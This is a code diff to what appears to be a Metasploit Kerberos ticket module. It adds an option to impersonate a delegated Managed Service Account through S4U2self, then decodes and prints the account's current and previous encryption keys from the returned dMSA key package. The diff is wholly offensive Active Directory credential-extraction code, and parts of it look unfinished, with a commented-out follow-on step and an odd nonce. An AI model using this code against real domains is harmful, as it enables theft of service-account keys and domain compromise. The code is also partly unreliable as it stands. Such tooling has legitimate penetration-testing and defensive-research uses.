@@ -50,6 +50,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PASSWORD', [ false, 'The domain user\'s password' ]),
         OptPath.new('CERT_FILE', [ false, 'The PKCS12 (.pfx) certificate file to authenticate with' ]),
         OptString.new('CERT_PASSWORD', [ false, 'The certificate file\'s password' ]),
+        OptBool.new('DMSA', [ false, 'Set to true if the account you are impersonating is a dMSA account' ]),
         OptString.new(
           'NTHASH', [
             false,
@@ -90,6 +91,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def validate_options
+
     if datastore['CERT_FILE'].present?
       pkcs12_storage = Msf::Exploit::Remote::Pkcs12::Storage.new(framework: framework, framework_module: self)
       @pfx = pkcs12_storage.read_pkcs12_cert_path(datastore['CERT_FILE'], datastore['CERT_PASSWORD'], workspace: workspace)[:value]
@@ -204,7 +206,50 @@ class MetasploitModule < Msf::Auxiliary
     end
     credential = authenticator.request_tgt_only(tgt_request_options)
 
-    if datastore['IMPERSONATE'].present?
+    if datastore['IMPERSONATE'].present? && datastore['DMSA'] == true
+      print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})")
+
+      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
+        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
+        name_string: [
+          "krbtgt",
+          @realm
+        ]
+      )
+
+      nonce = rand(9)
+      auth_options = {
+        sname: sname,
+        impersonate: datastore['IMPERSONATE'],
+        nonce: nonce,
+        dmsa: true
+      }
+      tgs_ticket, tgs_auth = authenticator.s4u2self(
+        credential,
+        auth_options.merge(ticket_storage: kerberos_ticket_storage(read: false, write: true))
+      )
+
+      # when Rex::Proto::Kerberos::Model::PreAuthType::DMSA_KEY_PACKAGE
+      # decoded = OpenSSL::ASN1.decode(self.value)
+      # DmsaKeyPackage.decode(decoded)
+      tgs_auth.pa_data.each do |pa_data|
+        if pa_data.type == Rex::Proto::Kerberos::Model::PreAuthType::DMSA_KEY_PACKAGE
+          dmsa_key_package = Rex::Proto::Kerberos::Model::DmsaKeyPackage.decode(pa_data.value)
+          print_dmsa_key_package_info(dmsa_key_package)
+
+        end
+        rescue ::Rex::Proto::Kerberos::Model::Error::KerberosDecodingError => e
+          print_error("#{peer} - Failed to decode dMSA Key Package: #{e.message}")
+          return
+      end
+
+      # auth_options[:sname] = Rex::Proto::Kerberos::Model::PrincipalName.new(
+      #   name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
+      #   name_string: datastore['SPN'].split('/')
+      # )
+      auth_options[:tgs_ticket] = tgs_ticket
+      # authenticator.s4u2proxy(credential, auth_options)
+    elsif datastore['IMPERSONATE'].present?
       print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})")
 
       sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
@@ -233,12 +278,50 @@ class MetasploitModule < Msf::Auxiliary
         name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
         name_string: datastore['SPN'].split('/')
       )
+      nonce = rand(9999999999)
       tgs_options = {
         sname: sname,
+        nonce: nonce,
         ticket_storage: kerberos_ticket_storage(read: false)
       }
 
       authenticator.request_tgs_only(credential, tgs_options)
+    end
+  end
+
+  def print_dmsa_key_package_info(dmsa_key_package)
+    print_status("dMSA Key Package:")
+
+    # Helper method to decode encryption type
+    def decode_encryption_type(type)
+      case type
+      when 18
+        "AES256"
+      when 17
+        "AES128"
+      when 23
+        "RC4"
+      else
+        "Unknown"
+      end
+    end
+
+    print_status("Current Keys:")
+    dmsa_key_package.current_keys.each do |key_set|
+      key_set.each do |key|
+        type = decode_encryption_type(key[0][0])
+        value = key[1][0]
+        print_good("  Type: #{type}, Key: #{value.unpack1('H*')}")
+      end
+    end
+
+    print_status("Previous Keys:")
+    dmsa_key_package.previous_keys.each do |key_set|
+      key_set.each do |key|
+        type = decode_encryption_type(key[0][0])
+        value = key[1][0]
+        print_good("  Type: #{type}, Key: #{value.unpack1('H*')}")
+      end
     end
   end
 
